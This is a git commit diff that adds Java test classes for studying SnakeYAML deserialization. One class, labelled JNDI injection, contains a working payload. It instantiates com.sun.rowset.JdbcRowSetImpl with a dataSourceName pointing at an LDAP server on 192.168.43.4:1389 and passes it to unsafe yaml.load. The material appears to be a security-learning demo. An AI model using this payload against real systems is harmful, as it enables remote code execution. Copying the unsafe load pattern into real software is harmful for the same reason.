2ffec9a946c0aa353e18b02f7618c22662f10497
novy <45167857+novysodope@users.noreply.github.com>
2021-03-24 15:04:45 +0800

    snakeyaml反序列化
    snakeyaml反序列化

---
+++ src/main/java/controller/vultest/TestImpl.java
@@ -0,0 +1,27 @@
+package vultest;
+
+/**
+ * @author: novy
+ * @date: 2021/3/5
+ * @time: 16:12
+ **/
+public class TestImpl {
+    public String name;
+    public int length;
+
+    public void setLength(int length) {
+        this.length = length;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public int getLength() {
+        return length;
+    }
+
+    public String getName() {
+        return name;
+    }
+}
---
+++ src/main/java/controller/vultest/YmlTest.java
@@ -0,0 +1,37 @@
+package vultest;
+
+/**
+ * @author: novy
+ * @date: 2021/3/5
+ * @time: 16:06
+ **/
+import org.yaml.snakeyaml.Yaml;
+
+public class YmlTest {
+    public static void main(String[] args) {
+        String normal ="hello novy";
+        Yaml yaml =new Yaml();
+        Object obj = yaml.load(normal);
+        System.out.println(obj);
+    }
+}
+//jndi注入
+class mYml {
+    public static void main(String[] args) {
+        String mevil = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://192.168.43.4:1389/o=reference', autoCommit: true}";
+        Yaml yaml = new Yaml();
+        Object obj = yaml.load(mevil);
+        System.out.println(obj);
+    }
+}
+//从例子查看直观结果
+class Test1{
+    public static void main(String[] args) {
+        Yaml yaml = new Yaml();
+        TestImpl test = new TestImpl();
+        test.name="novy";
+        test.length=24;
+        String dump = yaml.dump(test);
+        System.out.println(dump);
+    }
+}
